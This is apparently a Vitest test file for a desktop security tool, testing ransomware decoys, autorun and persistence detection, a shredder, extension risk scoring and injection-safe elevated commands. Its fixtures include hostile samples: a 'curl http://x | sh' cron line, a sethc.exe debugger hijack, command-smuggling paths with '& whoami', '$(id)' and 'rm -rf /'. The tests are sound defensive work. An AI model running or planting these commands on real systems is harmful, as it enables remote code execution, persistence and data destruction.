import { mkdir, mkdtemp, readFile, readdir, stat, symlink, utimes, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { describe, expect, it, vi } from "vitest";

import {
  RemovableWatcher,
  autorunFindings,
  decoyNames,
  decoyState,
  isExcluded,
  isSilent,
  parseProcMounts,
  parseWindowsRemovable,
  plantDecoys,
  sanitizeExclusions,
  silentUntilFrom,
  tamperedDecoys,
} from "../src/engine/protection";
import { RansomwareMonitor } from "../src/engine/ransomware";
import { parseStartupApproved, type StartupItem } from "../src/engine/security";
import { sanitizeChanges } from "../src/engine/settings";
import {
  assessExtension,
  browserExtensions,
  canSwitchOff,
  cleanJunk,
  hiddenModules,
  hiddenPids,
  hideDesktopEntry,
  junkCategories,
  measureJunk,
  checkProgramPath,
  elevatedFirewallCommand,
  elevatedWindowsCommand,
  netshBlockArgs,
  windowsArg,
  parseCrontab,
  parseIfeo,
  parseNetshRules,
  parseSchtasksCsv,
  parseWinlogon,
  shred,
  shredGuard,
  shredRefusal,
  switchOffStartup,
  switchOnStartup,
  unhideDesktopEntry,
} from "../src/engine/tools";

const temp = () => mkdtemp(join(tmpdir(), "qalaa-tools-"));
const exists = (path: string) => stat(path).then(() => true, () => false);

describe("exclusions", () => {
  it("match the item itself and everything inside an excluded folder", () => {
    const list = ["/home/a/Games", "/home/a/notes.txt"];
    expect(isExcluded("/home/a/Games", list, "linux")).toBe(true);
    expect(isExcluded("/home/a/Games/x/y.exe", list, "linux")).toBe(true);
    expect(isExcluded("/home/a/GamesExtra/y.exe", list, "linux")).toBe(false);
    expect(isExcluded("/home/a/notes.txt", list, "linux")).toBe(true);
    expect(isExcluded("/home/a/games/y.exe", list, "linux")).toBe(false);
    expect(isExcluded("C:\\Users\\A\\games\\y.exe", ["c:/users/a/Games/"], "win32")).toBe(true);
  });

  it("accept only absolute paths and never a whole drive", () => {
    expect(sanitizeExclusions(["relative/path", "/", "/home/a/Dev", "/home/a/Dev/", 42], "linux")).toEqual(["/home/a/Dev"]);
    expect(sanitizeExclusions(["C:\\", "D:\\Games", "games"], "win32")).toEqual(["D:\\Games"]);
    expect(sanitizeExclusions("nope", "linux")).toBeNull();
  });

  it("are part of the saved settings, with silent mode capped at a day", () => {
    const later = new Date(Date.now() + 10 * 24 * 3_600_000).toISOString();
    const changes = sanitizeChanges({ exclusions: ["/srv/data"], silentUntil: later, scanRemovable: false, ransomwareDecoys: false });
    expect(changes.exclusions).toEqual(["/srv/data"]);
    expect(Date.parse(changes.silentUntil!)).toBeLessThanOrEqual(Date.now() + 24 * 3_600_000 + 1000);
    expect(changes.scanRemovable).toBe(false);
    expect(changes.ransomwareDecoys).toBe(false);
    expect(sanitizeChanges({ silentUntil: "soon" }).silentUntil).toBeUndefined();
  });
});

describe("silent mode", () => {
  it("lasts until the chosen time, at most a day", () => {
    const now = Date.parse("2026-11-18T12:00:00Z");
    expect(silentUntilFrom(2, now)).toBe("2026-11-18T14:00:00.000Z");
    expect(silentUntilFrom(100, now)).toBe("2026-11-19T12:00:00.000Z");
    expect(silentUntilFrom(0, now)).toBeNull();
    expect(isSilent("2026-11-18T14:00:00.000Z", now)).toBe(true);
    expect(isSilent("2026-11-18T11:00:00.000Z", now)).toBe(false);
    expect(isSilent(null, now)).toBe(false);
  });
});

describe("ransomware decoys", () => {
  it("are planted hidden and report changes and deletions", async () => {
    const dir = await temp();
    const record = await plantDecoys([dir, join(dir, "missing")], "linux");
    const paths = Object.keys(record);
    expect(paths.map((p) => p.split("/").pop())).toEqual(decoyNames("linux"));
    expect(paths.every((p) => p.split("/").pop()!.startsWith("."))).toBe(true);
    expect(await decoyState(paths[0]!, record[paths[0]!]!)).toBeNull();
    await writeFile(paths[0]!, "encrypted!");
    expect(await decoyState(paths[0]!, record[paths[0]!]!)).toBe("changed");
    expect(await tamperedDecoys(record)).toEqual([{ path: paths[0], state: "changed" }]);
    expect(await decoyState(join(dir, "gone"), "x")).toBe("missing");
  });

  it("raise the ransomware alarm the moment one changes", async () => {
    const dir = await temp();
    const onAlert = vi.fn();
    const monitor = new RansomwareMonitor(onAlert);
    monitor.set([dir]);
    const record = await plantDecoys([dir], "linux");
    monitor.setDecoys(record);
    await new Promise((resolve) => setTimeout(resolve, 300));
    expect(onAlert).not.toHaveBeenCalled(); // planting itself is not an alarm
    await writeFile(Object.keys(record)[0]!, "ENCRYPTED");
    await vi.waitFor(() => expect(onAlert).toHaveBeenCalledTimes(1), { timeout: 5000 });
    expect(onAlert.mock.calls[0]![0].reasons[0]).toMatch(/decoy file/);
    monitor.close();
  });
});

describe("removable drives", () => {
  it("are read from /proc/mounts and from Windows", () => {
    const mounts = [
      "/dev/sda2 / ext4 rw 0 0",
      "/dev/sdb1 /media/sam/USB\\040STICK vfat rw,nosuid 0 0",
      "/dev/sdc1 /run/media/sam/CARD exfat rw 0 0",
      "tmpfs /run/user/1000 tmpfs rw 0 0",
      "/dev/sdd1 /mnt/backup ext4 rw 0 0",
    ].join("\n");
    expect(parseProcMounts(mounts)).toEqual(["/media/sam/USB STICK", "/run/media/sam/CARD", "/mnt/backup"]);
    expect(parseWindowsRemovable('[{"DeviceID":"E:"},{"DeviceID":"F:"}]')).toEqual(["E:\\", "F:\\"]);
    expect(parseWindowsRemovable('{"DeviceID":"G:"}')).toEqual(["G:\\"]);
    expect(parseWindowsRemovable("")).toEqual([]);
  });

  it("report only drives connected after watching started", async () => {
    let now = ["/media/old"];
    const onNew = vi.fn();
    const watcher = new RemovableWatcher(onNew, async () => now);
    expect(await watcher.poll()).toEqual([]);
    now = ["/media/old", "/media/new"];
    expect(await watcher.poll()).toEqual(["/media/new"]);
    expect(await watcher.poll()).toEqual([]);
    expect(onNew).toHaveBeenCalledExactlyOnceWith("/media/new");
  });

  it("flag autorun files that start programs", () => {
    expect(autorunFindings("autorun.inf", Buffer.from("[autorun]\r\nopen=setup.exe\r\nicon=a.ico\r\n")).map((f) => f.rule)).toEqual(["autorun_program"]);
    expect(autorunFindings("AUTORUN.INF", Buffer.from("[AutoRun]\nshell\\open\\command=evil.exe\n"))).toHaveLength(1);
    expect(autorunFindings("autorun.inf", Buffer.from("[autorun]\nicon=drive.ico\nlabel=Photos\n"))).toEqual([]);
    expect(autorunFindings("readme.txt", Buffer.from("[autorun]\nopen=x.exe"))).toEqual([]);
  });
});

describe("startup manager", () => {
  it("hides and unhides a .desktop entry reversibly", () => {
    const original = "[Desktop Entry]\nType=Application\nName=Updater\nExec=/usr/bin/updater\n";
    const hidden = hideDesktopEntry(original);
    expect(hidden).toContain("Hidden=true");
    expect(unhideDesktopEntry(hidden)).toBe(original);
  });

  it("switches a user autostart entry off and on (Linux)", async () => {
    const home = await temp();
    const autostart = join(home, ".config", "autostart");
    await mkdir(autostart, { recursive: true });
    const file = join(autostart, "updater.desktop");
    const original = "[Desktop Entry]\nType=Application\nName=Updater\nExec=/opt/u\n";
    await writeFile(file, original);
    const item: StartupItem = { id: "x|Updater", name: "Updater", command: "/opt/u", location: autostart, program: "/opt/u", warnings: [], source: file };
    expect(canSwitchOff(item, "linux", home)).toBe(true);
    const entry = await switchOffStartup(item, "linux", home);
    expect(entry.method).toBe("xdg-user");
    expect(await readFile(file, "utf8")).toContain("Hidden=true");
    await switchOnStartup(entry);
    expect(await readFile(file, "utf8")).toBe(original);
  });

  it("overrides a system-wide entry with a user copy instead of editing it", async () => {
    const home = await temp();
    const system = await temp();
    const file = join(system, "tracker.desktop");
    await writeFile(file, "[Desktop Entry]\nName=Tracker\nExec=/usr/bin/tracker\n");
    const item: StartupItem = { id: "s|Tracker", name: "Tracker", command: "/usr/bin/tracker", location: "/etc/xdg/autostart", program: null, warnings: [], source: file };
    const entry = await switchOffStartup(item, "linux", home);
    expect(entry.method).toBe("xdg-override");
    expect(await readFile(join(home, ".config", "autostart", "tracker.desktop"), "utf8")).toContain("Hidden=true");
    expect(await readFile(file, "utf8")).not.toContain("Hidden");
    await switchOnStartup(entry);
    expect(await exists(join(home, ".config", "autostart", "tracker.desktop"))).toBe(false);
  });

  it("knows which entries need administrator tools", () => {
    const base = { id: "i", name: "n", command: "c", program: null, warnings: [] };
    expect(canSwitchOff({ ...base, location: "HKCU\\...\\Run", source: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" }, "win32", "C:\\Users\\a")).toBe(true);
    expect(canSwitchOff({ ...base, location: "HKLM\\...\\RunOnce", source: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" }, "win32", "C:\\Users\\a")).toBe(false);
    expect(canSwitchOff({ ...base, location: "/Library/LaunchDaemons", source: "/Library/LaunchDaemons/x.plist" }, "darwin", "/Users/a")).toBe(false);
    expect(canSwitchOff({ ...base, location: "~/Library/LaunchAgents", source: "/Users/a/Library/LaunchAgents/x.plist" }, "darwin", "/Users/a")).toBe(true);
    expect(canSwitchOff({ ...base, location: "x" }, "linux", "/home/a")).toBe(false);
  });

  it("reads entries switched off in Task Manager", () => {
    const out = "\r\nHKEY_CURRENT_USER\\...\\StartupApproved\\Run\r\n    OneDrive    REG_BINARY    020000000000000000000000\r\n    Spotify    REG_BINARY    030000000000000000000000\r\n";
    expect([...parseStartupApproved(out)]).toEqual(["Spotify"]);
  });
});

describe("junk cleanup", () => {
  it("measures and removes only old files, never following links", async () => {
    const home = await temp();
    const outside = await temp();
    const thumbs = join(home, ".cache", "thumbnails", "large");
    await mkdir(thumbs, { recursive: true });
    const old = join(thumbs, "old.png");
    const fresh = join(thumbs, "fresh.png");
    await writeFile(old, Buffer.alloc(2048));
    await writeFile(fresh, Buffer.alloc(1024));
    const twoDaysAgo = new Date(Date.now() - 48 * 3_600_000);
    await utimes(old, twoDaysAgo, twoDaysAgo);
    const precious = join(outside, "precious.txt");
    await writeFile(precious, "keep me");
    await utimes(precious, twoDaysAgo, twoDaysAgo);
    await symlink(outside, join(thumbs, "link"));

    const categories = junkCategories("linux", home, {}, join(home, "tmp-none")).filter((c) => c.id === "thumbnails");
    expect(await measureJunk(categories)).toEqual([{ id: "thumbnails", label: "Thumbnail cache", files: 1, bytes: 2048 }]);
    expect(await cleanJunk(categories, ["thumbnails"])).toEqual({ files: 1, bytes: 2048, skipped: 0 });
    expect(await exists(old)).toBe(false);
    expect(await exists(fresh)).toBe(true);
    expect(await readFile(precious, "utf8")).toBe("keep me");
  });

  it("lists the expected places per system", () => {
    expect(junkCategories("win32", "C:\\Users\\a", { LOCALAPPDATA: "C:\\Users\\a\\AppData\\Local" }, "C:\\Temp").map((c) => c.id)).toEqual(["temp", "browser-cache", "thumbnails", "crash-reports"]);
    expect(junkCategories("darwin", "/Users/a", {}, "/tmp").map((c) => c.id)).toContain("trash");
  });
});

describe("file shredder", () => {
  it("destroys files and folders, and only unlinks symbolic links", async () => {
    const dir = await temp();
    const outside = await temp();
    const secret = join(dir, "secret.txt");
    await writeFile(secret, "account numbers");
    const folder = join(dir, "old-taxes");
    await mkdir(join(folder, "2019"), { recursive: true });
    await writeFile(join(folder, "2019", "a.pdf"), Buffer.alloc(5000, 1));
    await writeFile(join(folder, "b.pdf"), Buffer.alloc(10, 2));
    const target = join(outside, "target.txt");
    await writeFile(target, "not me");
    await symlink(target, join(dir, "link.txt"));

    expect(await shred(secret, 3)).toEqual({ files: 1, bytes: 15 });
    expect(await shred(folder)).toEqual({ files: 2, bytes: 5010 });
    await shred(join(dir, "link.txt"));
    expect(await readdir(dir)).toEqual([]);
    expect(await readFile(target, "utf8")).toBe("not me");
  });

  it("refuses system folders, Qalaa's data and the home folder itself", () => {
    const guard = shredGuard("linux", "/home/sam", ["/home/sam/.config/Qalaa Desktop"]);
    expect(shredRefusal("/home/sam/Documents/old.pdf", guard, "linux")).toBeNull();
    expect(shredRefusal("/home/sam", guard, "linux")).toMatch(/home folder/);
    expect(shredRefusal("/home", guard, "linux")).toMatch(/home folder/);
    expect(shredRefusal("/", guard, "linux")).toMatch(/drive/);
    expect(shredRefusal("/etc/passwd", guard, "linux")).toMatch(/system folder/);
    expect(shredRefusal("/var/log/syslog", guard, "linux")).toMatch(/system folder/);
    expect(shredRefusal("/home/sam/.config/Qalaa Desktop/quarantine", guard, "linux")).toMatch(/Qalaa/);
    expect(shredRefusal("/home/sam/.config", guard, "linux")).toMatch(/Qalaa/);
    const win = { inside: ["C:\\Windows", "C:\\Program Files"], exact: ["C:\\Users\\Sam"] };
    expect(shredRefusal("C:\\windows\\system32\\drivers\\etc\\hosts", win, "win32")).toMatch(/system folder/);
    expect(shredRefusal("C:\\Users\\Sam\\Desktop\\x.docx", win, "win32")).toBeNull();
    expect(shredRefusal("D:\\", win, "win32")).toMatch(/drive/);
  });
});

describe("browser extensions", () => {
  it("rates permissions in plain language", () => {
    expect(assessExtension({ permissions: ["storage"], host_permissions: ["https://example.org/*"] }, true)).toEqual({ risk: "low", reasons: [] });
    const spy = assessExtension({ permissions: ["cookies", "webRequest"], host_permissions: ["<all_urls>"] }, true);
    expect(spy.risk).toBe("high");
    expect(spy.reasons).toEqual(expect.arrayContaining(["can read and change every website you visit", "can read and change cookies (including sign-ins)"]));
    expect(assessExtension({ content_scripts: [{ matches: ["*://*/*"] }] }, true).risk).toBe("medium");
    expect(assessExtension({ permissions: ["storage"] }, false)).toEqual({ risk: "medium", reasons: ["was not installed from the browser's store"] });
  });

  it("reads Chrome-family and Firefox profiles", async () => {
    const home = await temp();
    const ext = join(home, ".config", "google-chrome", "Default", "Extensions", "abcdefghijklmnopabcdefghijklmnop", "1.2.0_0");
    await mkdir(join(ext, "_locales", "en"), { recursive: true });
    await writeFile(join(ext, "manifest.json"), JSON.stringify({ name: "__MSG_appName__", version: "1.2.0", default_locale: "en", update_url: "https://evil.example/update.xml", permissions: ["cookies"], host_permissions: ["<all_urls>"] }));
    await writeFile(join(ext, "_locales", "en", "messages.json"), JSON.stringify({ appName: { message: "Coupon Helper" } }));
    const ff = join(home, ".mozilla", "firefox", "abc.default");
    await mkdir(ff, { recursive: true });
    await writeFile(join(ff, "extensions.json"), JSON.stringify({ addons: [
      { id: "ublock@example", type: "extension", location: "app-profile", active: true, version: "1.0", signedState: 2, defaultLocale: { name: "Blocker" }, userPermissions: { permissions: ["storage"], origins: [] } },
      { id: "theme@x", type: "theme", location: "app-profile", active: true, version: "1" },
    ] }));
    const list = await browserExtensions("linux", home, {});
    expect(list.map((e) => [e.browser, e.name, e.risk, e.fromStore])).toEqual([
      ["Chrome", "Coupon Helper", "high", false],
      ["Firefox", "Blocker", "low", true],
    ]);
  });
});

describe("deep check", () => {
  it("finds processes and modules hidden from the system's lists", () => {
    expect(hiddenPids(new Set([1, 2, 3]), [4, 5, 6], (pid) => pid === 5)).toEqual([4, 6]);
    expect(hiddenModules("ext4 1 0 - Live 0x0\nvfat 1 0 - Live 0x0\n", ["ext4", "vfat", "diamorphine"])).toEqual(["diamorphine"]);
  });

  it("reads cron, scheduled tasks, debugger hijacks and the sign-in shell", () => {
    expect(parseCrontab("# m h dom mon dow command\nSHELL=/bin/sh\n*/5 * * * * curl http://x | sh\n@reboot /tmp/.x/run\n", "crontab")).toEqual([
      { source: "crontab", command: "curl http://x | sh" },
      { source: "crontab", command: "/tmp/.x/run" },
    ]);
    expect(parseCrontab("17 * * * * root cd / && run-parts --report /etc/cron.hourly\n", "/etc/crontab", true)).toEqual([{ source: "/etc/crontab", command: "cd / && run-parts --report /etc/cron.hourly" }]);
    const csv = '"HostName","TaskName","Next Run Time","Status","Author","Task To Run"\r\n"PC","\\Updater","N/A","Ready","Sam","C:\\Users\\Public\\u.exe"\r\n"PC","\\Updater","N/A","Ready","Sam","C:\\Users\\Public\\u.exe"\r\n"HostName","TaskName","Next Run Time","Status","Author","Task To Run"\r\n';
    expect(parseSchtasksCsv(csv)).toEqual([{ name: "\\Updater", command: "C:\\Users\\Public\\u.exe", author: "Sam" }]);
    const ifeo = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\r\n    Debugger    REG_SZ    C:\\Windows\\System32\\cmd.exe\r\n";
    expect(parseIfeo(ifeo)).toEqual([{ program: "sethc.exe", debugger: "C:\\Windows\\System32\\cmd.exe" }]);
    const winlogon = "    Shell    REG_SZ    explorer.exe, C:\\Users\\Public\\x.exe\r\n    Userinit    REG_SZ    C:\\Windows\\system32\\userinit.exe,\r\n";
    expect(parseWinlogon(winlogon)).toEqual([{ value: "Shell", data: "explorer.exe, C:\\Users\\Public\\x.exe" }]);
  });
});

describe("firewall blocking", () => {
  it("builds netsh rules and reads back the programs Qalaa blocked", () => {
    expect(netshBlockArgs("C:\\Apps\\tool.exe", "out")).toEqual(["advfirewall", "firewall", "add", "rule", "name=Qalaa block: tool.exe", "dir=out", "action=block", "program=C:\\Apps\\tool.exe", "enable=yes"]);
    const show = "Rule Name:                            Qalaa block: tool.exe\r\nEnabled:                              Yes\r\nProgram:                              C:\\Apps\\tool.exe\r\n\r\nRule Name:                            Other\r\nProgram:                              C:\\x.exe\r\n";
    expect(parseNetshRules(show)).toEqual(["C:\\Apps\\tool.exe"]);
  });
});

describe("Linux system watch", () => {
  it("lists the folders malware drops programs into and makes itself start from", async () => {
    const { executableDropFolders, persistenceFolders } = await import("../src/engine/protection");
    expect(executableDropFolders("linux", "/home/a")).toEqual(["/tmp", "/var/tmp", "/dev/shm", "/home/a/.local/bin", "/home/a/bin"]);
    expect(persistenceFolders("linux", "/home/a")).toContain("/home/a/.config/autostart");
    expect(executableDropFolders("win32", "C:\\Users\\a")).toEqual([]);
  });

  it("recognises programs by permission or content", async () => {
    const { looksRunnable } = await import("../src/engine/protection");
    const dir = await temp();
    await writeFile(join(dir, "data.txt"), "notes");
    await writeFile(join(dir, "tool"), "binary", { mode: 0o755 });
    await writeFile(join(dir, "script"), "#!/bin/sh\necho hi\n");
    await writeFile(join(dir, "elf"), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1]));
    expect(await looksRunnable(join(dir, "data.txt"))).toBe(false);
    expect(await looksRunnable(join(dir, "tool"))).toBe(true);
    expect(await looksRunnable(join(dir, "script"))).toBe(true);
    expect(await looksRunnable(join(dir, "elf"))).toBe(true);
    expect(await looksRunnable(dir)).toBe(false);
  });

  it("reports files dropped into a watched folder once they settle", async () => {
    const { DropWatcher } = await import("../src/engine/protection");
    const dir = await temp();
    const seen = vi.fn();
    const watcher = new DropWatcher(seen, 200);
    watcher.set([dir]);
    await writeFile(join(dir, "x.sh"), "#!/bin/sh\n");
    await writeFile(join(dir, "x.sh"), "#!/bin/sh\necho more\n");
    await vi.waitFor(() => expect(seen).toHaveBeenCalledWith(join(dir, "x.sh")), { timeout: 3000 });
    expect(seen).toHaveBeenCalledTimes(1);
    watcher.close();
  });
});

describe("Linux hardening and integrity", () => {
  it("scores kernel hardening settings", async () => {
    const { kernelHardeningCheck } = await import("../src/engine/posture");
    const good = { "kernel.yama.ptrace_scope": 1, "kernel.kptr_restrict": 1, "kernel.dmesg_restrict": 1, "kernel.randomize_va_space": 2, "fs.protected_symlinks": 1, "fs.protected_hardlinks": 1, "kernel.unprivileged_bpf_disabled": 2 };
    expect(kernelHardeningCheck(good).status).toBe("pass");
    const weak = kernelHardeningCheck({ ...good, "kernel.yama.ptrace_scope": 0, "kernel.randomize_va_space": 0 });
    expect(weak.status).toBe("warn");
    expect(weak.detail).toMatch(/ptrace_scope = 0/);
    expect(weak.fix).toMatch(/kernel.randomize_va_space = 2/);
    expect(kernelHardeningCheck({}).status).toBe("unknown");
  });

  it("finds system programs changed since their package installed them", async () => {
    const { parseVerify } = await import("../src/engine/tools");
    const dpkg = "missing     /usr/share/doc/coreutils/NEWS.gz\n??5??????   /usr/bin/ls\n??5?????? c /etc/sudoers\n?????????   /usr/bin/ps\n??5??????   /usr/share/man/man1/ls.1.gz\n";
    expect(parseVerify(dpkg)).toEqual(["/usr/bin/ls"]);
    const rpm = "S.5....T.    /usr/bin/netstat\n.M.......  c /etc/ssh/sshd_config\n..5....T.    /usr/lib64/libprocps.so.8\n";
    expect(parseVerify(rpm)).toEqual(["/usr/bin/netstat", "/usr/lib64/libprocps.so.8"]);
  });
});

describe("Linux system watch: late folders", () => {
  it("starts watching a folder once it is created", async () => {
    const { DropWatcher } = await import("../src/engine/protection");
    const dir = join(await temp(), "later", "bin");
    const seen = vi.fn();
    const watcher = new DropWatcher(seen, 100, 200);
    watcher.set([dir]);
    await mkdir(dir, { recursive: true });
    await new Promise((resolve) => setTimeout(resolve, 500));
    await writeFile(join(dir, "dropper"), "#!/bin/sh\n");
    await vi.waitFor(() => expect(seen).toHaveBeenCalledWith(join(dir, "dropper")), { timeout: 3000 });
    watcher.close();
  });
});

describe("elevated commands never splice a path into a shell", () => {
  const decode = (args: string[]) => {
    const inner = /'-EncodedCommand','([A-Za-z0-9+/=]+)'/.exec(args.at(-1)!)![1]!;
    return Buffer.from(inner, "base64").toString("utf16le");
  };

  it("Windows: a path with & and quotes stays a single-quoted literal in an encoded script", () => {
    const program = "C:\\Apps\\a&calc.exe & whoami %PATH% ^ 'x'.exe";
    const { command, args } = elevatedFirewallCommand("block", program, "win32");
    expect(command).toBe("powershell.exe");
    expect(args.join(" ")).not.toContain("cmd");
    expect(args.join(" ")).not.toContain("calc");
    const script = decode(args);
    expect(script).toContain("'program=C:\\Apps\\a&calc.exe & whoami %PATH% ^ ''x''.exe'");
    expect(script.match(/advfirewall firewall add rule/g)).toHaveLength(2);
  });

  it("macOS: the path is an osascript argument, quoted with quoted form of", () => {
    const program = '/Applications/Evil" & do shell script "id.app';
    expect(() => elevatedFirewallCommand("block", program, "darwin")).toThrow(/can't be used/);
    const ok = "/Applications/It's $(id) `x`.app";
    const { command, args } = elevatedFirewallCommand("unblock", ok, "darwin");
    expect(command).toBe("osascript");
    expect(args.at(-1)).toBe(ok);
    expect(args.slice(0, -1).join(" ")).not.toContain("$(id)");
    expect(args).toContain("set p to quoted form of (item 1 of argv)");
  });

  it("refuses relative, multi-line and forbidden-character paths", () => {
    expect(() => checkProgramPath("tool.exe")).toThrow(/full path/);
    expect(() => checkProgramPath("/bin/a\nrm -rf /")).toThrow(/can't be used/);
    expect(() => checkProgramPath("C:\\a|b.exe")).toThrow(/can't be used/);
    expect(() => elevatedFirewallCommand("block", "/usr/bin/x", "linux")).toThrow(/not available on Linux/);
  });

  it("quotes each elevated argument by the Windows command-line rules", () => {
    expect(windowsArg("plain")).toBe("plain");
    expect(windowsArg("x /va")).toBe('"x /va"');
    expect(windowsArg('a"b')).toBe('"a\\"b"');
    expect(windowsArg("C:\\dir with space\\")).toBe('"C:\\dir with space\\\\"');
    expect(windowsArg("")).toBe('""');
    const args = elevatedWindowsCommand("reg.exe", ["delete", "HKLM\\Run", "/v", "x /va", "/f"]);
    expect(args.at(-1)).toContain(`'"x /va"'`);
  });
});

